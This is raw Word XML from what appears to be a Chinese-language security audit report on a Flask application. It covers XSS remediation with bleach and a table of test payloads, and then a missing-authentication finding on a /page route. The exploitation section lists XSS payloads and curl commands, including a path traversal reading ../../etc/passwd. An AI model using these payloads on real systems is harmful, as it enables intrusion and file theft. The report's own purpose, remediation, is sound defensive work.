          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 社工钓鱼</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：在受信任域名下渲染钓鱼页面，诱导用户输入敏感信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• CSRF 攻击辅助</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：利用 XSS 绕过 CSRF 防护，以用户身份执行任意操作</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>双重防护</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">：后端 bleach 清洗 + 前端移除 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>| safe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>修复 1 — 后端清洗（app.py）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import bleach</w:t>
        <w:br/>
        <w:br/>
        <w:t># 只允许安全的 HTML 标签</w:t>
        <w:br/>
        <w:t>allowed_tags = ["h2", "h3", "h4", "p", "b", "strong", "em", "i",</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "hr", "br", "ul", "ol", "li", "a", "code", "pre",</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "blockquote", "table", "thead", "tbody", "tr", "th", "td"]</w:t>
        <w:br/>
        <w:t>allowed_attrs = {"a": ["href", "title"]}</w:t>
        <w:br/>
        <w:t>content = bleach.clean(content, tags=allowed_tags, attributes=allowed_attrs, strip=True)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>修复 2 — 前端模板（index.html）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>&lt;!-- 修复后：移除 | safe，使用 Jinja2 自动转义 --&gt;</w:t>
        <w:br/>
        <w:t>{% if page_content %}</w:t>
        <w:br/>
        <w:t>&lt;div class="card"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;div class="page-content"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        {{ page_content }}</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/div&gt;</w:t>
        <w:br/>
        <w:t>&lt;/div&gt;</w:t>
        <w:br/>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复效果验证</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>被删除</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">✅ </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>alert(1)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>（文本）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;img src=x onerror=alert(1)&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>被删除</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 完全删除</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>清理 href</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">✅ </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;a&gt;click&lt;/a&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;h2&gt;标题&lt;/h2&gt;&lt;p&gt;段落&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>保留正常标签</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 正常显示</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 7】/page 路由未授权访问（CWE-306）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-306: Missing Authentication for Critical Function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由未做任何登录校验，与系统中 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/search</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>/upload</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 等路由均需登录的模式不一致。这意味着任何知道或发现该 URL 的匿名访客都可以直接调用，无需提供任何身份凭证。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 对比：其他路由均有身份校验</w:t>
        <w:br/>
        <w:t>@app.route("/search")</w:t>
        <w:br/>
        <w:t>def search():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not session.get("username"):     # ✅ 有校验</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return redirect("/login")</w:t>
        <w:br/>
        <w:br/>
        <w:t># /page 路由无任何身份校验  ❌</w:t>
        <w:br/>
        <w:t>@app.route("/page")</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")  # ❌ 未检查登录态</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>攻击者只需直接在浏览器地址栏或 curl 中访问即可，无需任何登录操作，无需 Cookie，无需 Session：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 完全匿名调用（不需要任何登录信息）</w:t>
        <w:br/>
        <w:t>curl "http://target/page?name=help"</w:t>
        <w:br/>
        <w:t>← 正常返回帮助中心页面</w:t>
        <w:br/>
        <w:br/>
        <w:t>curl "http://target/page?name=../../etc/passwd"</w:t>
        <w:br/>
        <w:t>← 直接读取服务器任意文件</w:t>
        <w:br/>
        <w:br/>
        <w:t># 批量枚举</w:t>
        <w:br/>
        <w:t>for name in help about faq test admin system; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl "http://target/page?name=$name"</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>由于无认证，所有 LFI 攻击（漏洞 1）和 XSS 攻击（漏洞 6）的攻击面均扩大为任意互联网用户可实施。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 攻击面无限扩大</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：认证缺失使得 LFI/XSS 等漏洞从需要登录才能利用变为任意公网用户可随意利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 大规模自动化攻击</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：无需认证意味着攻击者可以使用脚本批量扫描和利用，攻击成本极低</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 日志溯源困难</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：缺乏用户身份信息，攻击行为在日志中与正常流量混合，难以审计和追溯</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 合规风险</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
